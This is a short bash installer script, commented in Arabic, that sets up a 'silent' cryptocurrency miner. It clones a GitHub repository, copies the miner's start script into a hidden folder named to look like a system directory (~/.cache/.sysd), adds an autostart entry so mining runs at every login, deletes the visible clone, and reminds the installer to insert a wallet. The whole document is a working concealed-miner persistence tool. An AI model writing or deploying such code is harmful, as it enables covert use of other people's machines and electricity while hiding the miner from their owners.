#!/bin/bash

# ✅ 1. إعداد رابط GitHub (غيّره إلى رابطك الصحيح)
REPO_URL="https://github.com/ewilkinso/java.git"
CLONE_DIR="$HOME/.temp_miner_repo"
HIDDEN_DIR="$HOME/.cache/.sysd"
AUTOSTART_DIR="$HOME/.config/autostart"

echo "[+] جاري تحميل ملفات التعدين من GitHub..."

# ✅ 2. تحميل المشروع من GitHub
git clone --depth=1 "$REPO_URL" "$CLONE_DIR" > /dev/null 2>&1

# ✅ 3. التحقق من وجود الملفات المطلوبة
if [ ! -f "$CLONE_DIR/start.sh" ] || [ ! -f "$CLONE_DIR/silentminer.desktop" ]; then
    echo "❌ فشل: لم يتم العثور على start.sh أو silentminer.desktop"
    exit 1
fi

# ✅ 4. إنشاء المجلدات الخفية
mkdir -p "$HIDDEN_DIR"
mkdir -p "$AUTOSTART_DIR"

# ✅ 5. نقل الملفات إلى أماكنها
cp "$CLONE_DIR/start.sh" "$HIDDEN_DIR/"
chmod +x "$HIDDEN_DIR/start.sh"

cp "$CLONE_DIR/silentminer.desktop" "$AUTOSTART_DIR/"

# ✅ 6. حذف المجلد الظاهر
rm -rf "$CLONE_DIR"

# ✅ 7. رسالة نجاح
echo "✅ تم التثبيت بنجاح!"
echo "📂 ملفات التعدين موجودة في: $HIDDEN_DIR"
echo "🔁 التعدين سيبدأ تلقائيًا عند كل تشغيل"
echo ""
echo "⚠️ لا تنس تعديل المحفظة داخل:"
echo "$HIDDEN_DIR/start.sh"
